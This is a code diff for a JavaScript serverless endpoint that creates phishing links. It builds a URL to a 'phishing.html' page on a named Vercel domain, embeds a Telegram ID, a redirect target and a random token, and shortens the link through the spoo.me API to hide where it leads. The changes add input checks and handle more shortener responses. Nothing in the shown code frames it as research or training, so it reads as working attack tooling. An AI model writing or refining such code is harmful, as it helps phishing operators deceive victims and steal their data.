@@ -6,14 +6,20 @@ export default async (req, res) => {
   try {
     const { telegramId, redirectUrl } = req.body;
 
+    // Validate required fields
+    if (!telegramId || !redirectUrl) {
+      return res.status(400).json({ error: 'Missing required fields' });
+    }
+
     // Generate unique token
     const token = [...Array(32)].map(() => 
       Math.random().toString(36)[2]).join('');
     
     // Generate phishing URL
-    const phishingUrl = `https://opaslabs.vercel.app/phishing.html?telegramId=${telegramId}&redirectUrl=${encodeURIComponent(redirectUrl)}&token=${token}`;
+    const baseUrl = 'https://opaslabs.vercel.app/phishing.html';
+    const phishingUrl = `${baseUrl}?telegramId=${telegramId}&redirectUrl=${encodeURIComponent(redirectUrl)}&token=${token}`;
     
-    // Shorten URL using spoo.me API - CORRECTED
+    // Shorten URL using spoo.me API
     try {
       const shortenResponse = await fetch('https://spoo.me/', {
         method: 'POST',
@@ -26,20 +32,22 @@ export default async (req, res) => {
 
       const data = await shortenResponse.json();
       
-      // Handle successful shortening
-      if (data.short_url) {
-        return res.status(200).json({ link: data.short_url });
-      } 
-      // Handle API error response
-      else if (data.message) {
-        console.error('Spoo.me error:', data.message);
-        return res.status(200).json({ link: phishingUrl });
+      // Handle different possible response formats from Spoo.me
+      const shortUrl = data.short_url || 
+                      (data.url && data.url.short) || 
+                      (data.result && data.result.short_url);
+      
+      if (shortUrl) {
+        return res.status(200).json({ link: shortUrl });
       }
+      
+      // Log API error if no short URL was returned
+      console.error('Spoo.me API Error:', data.message || 'Unknown error');
     } catch (shortenError) {
-      console.error('URL shortening failed:', shortenError);
+      console.error('URL shortening failed:', shortenError.message);
     }
 
-    // Fallback to original URL if any error occurs
+    // Fallback to original URL if shortening fails
     res.status(200).json({ link: phishingUrl });
 
   } catch (error) {
